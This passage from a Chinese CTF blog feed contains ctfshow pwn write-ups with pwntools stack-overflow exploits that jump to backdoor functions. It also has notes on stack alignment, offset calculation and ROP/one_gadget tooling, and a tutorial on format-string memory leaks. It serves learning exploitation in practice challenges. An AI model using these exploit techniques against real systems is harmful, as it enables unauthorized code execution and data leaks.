[ebp-4Ch] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">24</span>]; <span class="comment">// [esp+44h] [ebp-34h] BYREF  </span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+5Ch] [ebp-1Ch]  </span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="built_in">sizeof</span>(s));  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Who are you?&quot;</span>);  </span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">0x20u</span>);  </span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;unk_804D0A0, &amp;unk_804A350);  </span><br><span class="line">  std::string::<span class="keyword">operator</span>+=(&amp;unk_804D0A0, s);  </span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v10, &amp;unk_804D0B8);  </span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v11, &amp;unk_804D0A0);  </span><br><span class="line">  <span class="built_in">sub_8048F06</span>(v8);  </span><br><span class="line">  std::string::~<span class="built_in">string</span>(v11, v11, v10);  </span><br><span class="line">  std::string::~<span class="built_in">string</span>(v10, v6, v7);  </span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_80496D6</span>(v8) &gt; <span class="number">1u</span> )  </span><br><span class="line">  &#123;  </span><br><span class="line">    std::string::<span class="keyword">operator</span>=(&amp;unk_804D0A0, &amp;unk_804A350);  </span><br><span class="line">    v0 = <span class="built_in">sub_8049700</span>(v8, <span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_8049722</span>(v0, &amp;unk_804A350) )  </span><br><span class="line">    &#123;  </span><br><span class="line">      v1 = <span class="built_in">sub_8049700</span>(v8, <span class="number">0</span>);  </span><br><span class="line">      std::string::<span class="keyword">operator</span>+=(&amp;unk_804D0A0, v1);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; ; ++i )  </span><br><span class="line">    &#123;  </span><br><span class="line">      v2 = <span class="built_in">sub_80496D6</span>(v8);  </span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt;= i )  </span><br><span class="line">        <span class="keyword">break</span>;  </span><br><span class="line">      std::string::<span class="keyword">operator</span>+=(&amp;unk_804D0A0, <span class="string">&quot;IronMan&quot;</span>);  </span><br><span class="line">      v3 = <span class="built_in">sub_8049700</span>(v8, i);  </span><br><span class="line">      std::string::<span class="keyword">operator</span>+=(&amp;unk_804D0A0, v3);  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">  v4 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>(&amp;unk_804D0A0);  </span><br><span class="line">  <span class="built_in">strcpy</span>(s, v4);  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Wow!you are:%s&quot;</span>, s);  </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_8049616</span>(v8);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到关键函数<code>read</code>和<code>strcpy</code>，<code>read</code>函数处限制字节大小为<code>0x20</code>，无溢出，观察<code>strcpy</code>函数，注意到，它将<code>v4</code>字符串复制到<code>S</code>，我们追踪一下<code>v4</code>的处理逻辑：<br>重点看这一部分<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/5e3abc24-bf14-4554-9094-556fec0ac7c4.png" alt="alt text"><br>这部分说明了，有些特殊字符输入程序，会替换为<code>IronMan</code>，剩余字符会原样输出，我们测试一下是哪些字符会被替换，这时我们构造栈溢出的关键：<br>生成<code>a-z A-Z</code>字符串</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz  </span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br></pre></td></tr></table></figure><p>然后运行程序输入<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/0537e0b1-0cd2-4523-8918-9da04ab86e4a.png" alt="alt text"><br>输入<code>I</code>便会替换，那么就明了了，我们只需要输入最高<code>0x20</code>个字节的<code>I</code>，程序便会替换出<code>0xE0</code>个字节，可以造成栈溢出。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/699c4bc1-e48f-43d0-88df-fe600d365d48.png" alt="alt text"><br>后门函数也已经找到<br>这里的偏移，因为要覆盖返回地址需要$0x6c+0x04=0x70$，所以我们只需要输入<code>0x10</code>个<code>I</code>即可。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b7cf9763-04c3-4603-8f3c-e122ae0e2303.png" alt="alt text"><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">backdoor = <span class="number">0x0804902E</span>  </span><br><span class="line">offset = <span class="number">0x10</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * offset + p32(backdoor)  </span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x0804924D&#x27;)  </span></span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/cfd1d5e7-cac8-47ea-996b-956ebc682851.png" alt="alt text"></p><h2 id="pwn-052">pwn_052</h2><p>迎面走来的flag让我如此蠢蠢欲动</p><p>checksec查保护，32位程序，仅开启NX保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/7df37284-8bfe-408e-89a1-5a5e2db2f224.png" alt="alt text"><br>ida反编译<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d1d879cf-487c-4bac-acee-385d036f2f0b.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a1f76bcb-302b-4257-9607-632bbcc693c5.png" alt="alt text"><br><code>gets</code>栈溢出，存在后门函数。<br>需要注意的是，<code>flag</code>函数处需要满足两个条件才能将flag正确输出，<code>p32(0x080483aa)</code>作为返回地址，后面跟上需要满足的条件<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">backdoor = <span class="number">0x08048586</span>  </span><br><span class="line">offset = <span class="number">0x6C</span> + <span class="number">0x04</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(backdoor) + p32(<span class="number">0x080483aa</span>) + p32(<span class="number">876</span>) + p32(<span class="number">877</span>)  </span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x0804924D&#x27;)  </span></span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ctfshow_pwn题刷题笔记</summary>
    
    
    
    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn的补充知识</title>
    <link href="https://www.xvzhang.fun/posts/1b534064.html"/>
    <id>https://www.xvzhang.fun/posts/1b534064.html</id>
    <published>2025-05-07T07:06:59.000Z</published>
    <updated>2025-05-10T14:59:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1>堆栈平衡</h1><p>堆栈平衡是指在函数调用过程中，确保堆栈在进入和结束时保持一致。函数执行前到ret执行之前，堆栈栈顶的地址必须是<code>call</code>指令的下一个地址。如果堆栈变化了，需要在ret执行前将堆栈恢复称原来的样子，以确保程序能回到正确的位置。</p><p>64位ubuntu18以上系统调用system函数时是需要栈对齐的。因为64位下system函数存在<code>movaps</code>指令，这个指令要求内存地址必需16字节对齐。<br>因为64位程序的地址是8字节的，而十六进制是满16进位，所以64位程序的栈地址末尾为<code>0或8</code>，只有当地址末尾是0的时候，才算是与16字节对齐了，如果末尾是8，就是没有对齐，所以如果要在ubuntu18以上的64位程序中执行system函数，必须要保证system地址末尾为0。<br>程序在执行一个对栈指令(如<code>pop、ret、push</code>等，<code>mov</code>这样的不算对栈的操作指令)，则栈地址就会<code>+8</code>或<code>-8</code>，为了使rsp对齐16字节，核心思想就是增加或者减少栈内容，使<code>rsp</code>地址能相应的增加或减少8字节，利用这样的方式来对齐16字节。因为栈中地址都是以<code>0</code>或<code>8</code>结尾，0已经对齐16字节，因此只需要进行奇数次pop或者push操作，就能把地址是8结尾的rsp变为0结尾，使其16字节对齐。</p><ol><li>去将system函数地址+1，也就是跳过一条栈操作指令，使rsp对齐。</li><li>直接在调用system函数地址之前去调用一个ret指令。ret指令等同于pop rip，该指令使rsp+8，从而完成rsp16字节对齐，实现了栈对齐。<br><a href="https://www.bilibili.com/video/BV15W4y1N7yN/?spm_id_from=top_right_bar_window_dynamic.content.click&amp;vd_source=42c0bbf1fee01fedba3e9853a8c831a1">pwn技术分享—执行system前为何要执行retn指令</a><br><a href="https://www.cnblogs.com/ZIKH26/articles/15996874.html">关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</a></li></ol><h1>偏移量计算</h1><h2 id="GDB-peda计算偏移">GDB-peda计算偏移</h2><p><strong>64位程序</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./pwn  </span><br><span class="line">pattern create 200</span><br></pre></td></tr></table></figure><p>复制生成的200个测试字节，下断点到输入函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c70c70bc-e74e-4991-a7a7-242c934c2c5d.png" alt="alt text"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ni</span><br></pre></td></tr></table></figure><p>输入刚刚的测试字符<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b951aab4-7c3f-4ff1-8067-322864435067.png" alt="alt text"><br>可以看到，程序崩溃，若程序未崩溃，则要添加更多的测试字节数。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c2e5fe86-8041-418e-ac1f-2b1549722780.png" alt="alt text"><br>复制RBP这里的八个字节，然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern offset 6AALAAhA</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/31620a82-f4e7-480b-b165-60f42f184328.png" alt="alt text"><br>得到计算出得偏移为96<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/01691e64-91f6-4eeb-8be6-14e8ef4bcabc.png" alt="alt text"><br>我们验证一下：<br>输入96+8字节（因为是64位程序），刚好覆盖掉RBP寄存器<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d49b551c-e7c4-41f7-b995-aab29e1e5362.png" alt="alt text"></p><h3 id="GDB-PWNdbg计算偏移">GDB-PWNdbg计算偏移</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./pwn  </span><br><span class="line">cyclic 200</span><br></pre></td></tr></table></figure><p>生成200个字节，然后下断点运行到输入点，输入上述生成的200字节，程序报错，找到RBP的地址，复制。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/1423f756-1d3d-40f6-9c7a-8d29cbd9491d.png" alt="alt text"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic -l 0x616161616161616d</span><br></pre></td></tr></table></figure><p>同样计算出偏移为96<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/25b7b240-1b1c-4ead-aa06-e5934357d05c.png" alt="alt text"></p><h1>ret2libc工具</h1><h2 id="ROPgadget">ROPgadget</h2><p>获取<code>gadget</code>地址，<code>--binary</code>参数指定文件，可以是可执行文件或<code>libc</code>文件，<code>grep</code>用于筛选，<code>--string</code>用于筛选字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;rdi&#x27;</span> <span class="comment">#控制寄存器的值</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./pwn --string <span class="string">&#x27;/bin/sh&#x27;</span> <span class="comment">#查找字符串</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./libc-2.35.so --only <span class="string">&#x27;leave|ret&#x27;</span> | grep <span class="string">&#x27;leave&#x27;</span> <span class="comment">#查找leave ret指令地址</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./pwn --ropchain <span class="comment">#生成现成的rop利用链直接getshell，适用于静态编译的程序</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./pwn --only <span class="string">&#x27;ret&#x27;</span> <span class="comment">#查找ret指令的地址</span></span></span><br></pre></td></tr></table></figure><h3 id="patchelf">patchelf</h3><p>更改可执行文件的动态链接文件，更改<code>ld</code>可以直接指定<code>ld</code>文件，而更改<code>libc</code>需要先使用<code>ldd</code>查看原<code>libc</code>作为<code>--replace-needed</code>选项的第一个参数，一般默认是<code>libc.so.6</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">patchelf --replace-needed libc.so.6 ./2.38/libc.so.6 ./pwn <span class="comment">#更改libc</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">patchelf --set-interpreter ./2.35/ld-linux-x86-64.so.2 ./pwn <span class="comment">#更改ld</span></span></span><br></pre></td></tr></table></figure><h3 id="onegadget">onegadget</h3><p>能直接getshell的gadget，添加参数<code>-l2</code>可以获得更多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget ./libc.so.6</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">补充以下在比赛中遇到的pwn题所学到的知识。</summary>
    
    
    
    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
    
    
    <category term="CTF,PWN" scheme="https://www.xvzhang.fun/tags/CTF-PWN/"/>
    
  </entry>
  
  <entry>
    <title>pwn入门之路（二）</title>
    <link href="https://www.xvzhang.fun/posts/1180d2c1.html"/>
    <id>https://www.xvzhang.fun/posts/1180d2c1.html</id>
    <published>2025-05-07T03:59:18.000Z</published>
    <updated>2025-05-10T14:59:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1>格式化字符串(Format String)</h1><h2 id="原理">原理</h2><p><strong>格式化字符串函数介绍</strong>：<br>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。也就是格式化字符串函数将计算机内存中表示的数据转化为可读字符串。几乎所有的C/C++程序都会利用到格式化字符串函数来输出信息，调试程序或者处理字符串。一般来说，格式化字符串在利用时主要分为三个部分。</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>可选后续参数</li></ul><p>如<code>printf</code>函数：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/ac8977a8-d655-45c9-b6ba-dda7b581f924.png" alt="alt text"><br><strong>格式化字符串函数</strong>：<br>常见的格式化字符串函数有<br>输入：scanf<br>输出：</p><table><thead><tr><th>函数</th><th>基本介绍</th></tr></thead><tbody><tr><td>printf</td><td>输出到stdout</td></tr><tr><td>fprintf</td><td>输出到指定FILE流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定FILE流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置 argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr><tr><td>err, verr, warn, vwarn 等</td><td>。。。</td></tr><tr><td><strong>格式化字符串</strong>：</td><td></td></tr><tr><td>格式化字符串中的占位符用于指明输出的参数值如何格式化。</td><td></td></tr><tr><td>格式化占位符的基本语法：</td><td></td></tr><tr><td><code>%[parameter][flags][field width][.precision][length]type</code></td><td></td></tr><tr><td>每种pattern的含义请参考<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">格式化字符串</a></td><td></td></tr><tr><td>其中，我们关注的pattern如下：</td><td></td></tr></tbody></table><ul><li>parameter<ul><li><code>n$</code>，获取格式化字符串中的指定参数</li></ul></li><li>flag</li><li>field width<ul><li>输出的最小宽度</li></ul></li><li>precision<ul><li>输出的最大长度</li></ul></li><li>length，输出的长度<ul><li>hh，输出一个字节</li><li>h，输出一个双字节</li></ul></li><li>type<ul><li>d/i，有符号证书</li><li>u，无符号证书</li><li>x/X，16进制unsigned int。x使用小写字母；X使用大写字符。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</li><li>o，8进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</li><li>s，如果没有用|标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了|标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用了wcrtomb函数。</li><li>c，如果没有用|标志，把int参数转为unsigned char型输出；如果用了|标志，把win_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</li><li>p，void*型，输出对应变量的值。<code>printf(&quot;%p&quot;,a)</code>用地址的格式打印变量a的值，<code>printf(&quot;%p&quot;,&amp;a)</code>打印变量a所在的地址。</li><li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>% <code>%</code>字面值，不接受任何flags，width</li></ul></li></ul><p>参数：就是相应的要输出的变量。</p><h2 id="格式化字符串漏洞原理">格式化字符串漏洞原理</h2><p>格式化字符串函数是根据格式化字符串来解析的，那么相应的要被解析的采纳数的个数也自然是由这个格式化字符串所控制。比如说<code>%s</code>表明我们会输出一个字符串参数。<br>如上的例子，在未<code>call printf</code>之前，栈上的布局由高地址到低地址依次如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">some value  </span><br><span class="line">3.14  </span><br><span class="line">123456  </span><br><span class="line">addr of &quot;red&quot;  </span><br><span class="line">addr of format string: Color %s...</span><br></pre></td></tr></table></figure><p>如果我们这里假设3.14上面的值为某个未知的值。<br>在进入printf之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是<code>%</code>，直接输出到相应标准输出</li><li>当前字符是<code>%</code>，继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是<code>%</code>，输出%</li><li>否则根据相应的字符，获取相应的采纳数，对其进行解析并输出。</li></ul></li></ul><p>若我们编写的程序为：<br><code>printf(&quot;Color %s, Number %d, Float %4.2f&quot;);</code><br>可以看到，我们并没有提供参数，那么程序会如何运行呢，程序会将栈上存储格式化字符串地址上面的三个变量分别解析为：</p><ol><li>解析其地址对应的字符串</li><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值</li></ol><p>如：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a15d070d-c9f0-41ef-aeed-4cf55313c50a.png" alt="alt text"><br>对于2，3来说无妨，但是对于1来说，如果提供了一个不可访问地址，比如0，则程序便会因此而崩溃。</p><h2 id="利用">利用</h2><p>格式化字符串的两个利用手段：</p><ul><li>使程序崩溃，因为<code>%s</code>对应参数地址不合法的概率比较大</li><li>查看进程内容，根据<code>%d %f</code>输出栈上的内容</li></ul><p>程序崩溃：只需要输入若干个<code>%s</code>即可，因为在栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身不能控制程序，但是可以造成程序不可用。</p><h3 id="泄露内存">泄露内存</h3><p>利用格式化字符串漏洞，我们还可以获取想要输出的内容。一般有如下操作：</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用GOT表得到libc函数地址，进而获取libc，进而获取其他libc函数地址。</li><li>盲打，dump整个程序，获取有用信息。</li></ul></li></ul><h4 id="泄露栈内存">泄露栈内存</h4><p>例：给定以下程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>];  </span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);  </span><br><span class="line">    <span class="built_in">printf</span>(s);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们编译一下，发现编译器警告，指出了我们的程序中没有给出格式化字符串的参数的问题：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/0862bc9d-080c-43ca-a0d1-d59e287ebc0e.png" alt="alt text"><br>根据C语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数(64位会根据其传参规则进行获取)。这里使用32位。<br><strong>获取栈变量数值</strong>：<br>我们可以利用格式化字符串来获取栈上变量的数值：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/35c64ca4-8e36-48f7-b89e-3b2da3889f14.png" alt="alt text"><br>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用GDB调试一下：<br>首先打断点在printf函数处，然后输入内容<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/88f678f3-60b4-4d53-a449-04299a0df54a.png" alt="alt text"><br>回车，可以看到，程序首先断在了第一次调用printf函数的位置<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/2af9bc3e-b318-42a2-91f7-e929d209e5a3.png" alt="alt text"><br>可以看出，此时已经进入printf函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的只，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4c5ce452-4bcf-406a-ba38-5a68c8a40e90.png" alt="alt text"><br>此时，由于格式化字符串为%x%x%x，所以，程序会将栈上的<code>0xffffd524</code>之后的值分别作为第一、第二、第三个参数按照int型进行解析，分别输出。继续执行，我们可以得到如下结果：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/20250410185539.png" alt="alt text"><br>当然，我们也可以使用%p来获取数据，如下：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/048feb06-af52-4b1d-90a2-13329152e368.png" alt="alt text"><br>这里需要注意的是，并不是每次得到的结果都一样，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。<br>值得注意的是，上述方法，都是依次获得栈上的每个参数，我们如果需要直接获取栈中被视为第n+1个参数的值，怎么办？如下：<br><code>%n$x</code>，利用该字符串，我们就可以获取到对应的n+1个参数的数值。为什么是n+1个参数呢，这时因为格式化参数里面n指的是该格式化字符串对应的第n个输出参数，那相对与输出函数来说，就是n+1个参数了。<br>使用gdb调试:<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4c059749-117d-4fb3-97f5-15a17bfec6ad.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/855dd2c5-4fdb-4447-bcb2-31c06960b8bb.png" alt="alt text"><br>可以看到，我们确实获得了printf的第4个参数所对应的值。</p><h4 id="获取栈变量对应字符串">获取栈变量对应字符串</h4><p>使用<code>%s</code>获取栈变量对应的字符串。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/2378caee-3232-4aed-be1f-95cec8f115c2.png" alt="alt text"><br>可以看到，在第二次执行printf函数的时候，确实是将0xffffd524处的变量视为字符串变量，输出了其数值对应地址处的字符串。<br>**当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。<br>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定printf的第3个参数，程序不能解析，就崩溃了。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/84fa9803-eed3-4dd5-9938-a17fdfbb9547.png" alt="alt text"></p><p><strong>小技巧总结</strong>：</p><ol><li>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别</li><li>利用%s来获取变量所对应地址的内容，只不过有零截断</li><li>利用<code>%order$x</code>来获取指定参数的值，利用<code>%order$s</code>来获取指定参数对应地址的内容。</li></ol><h4 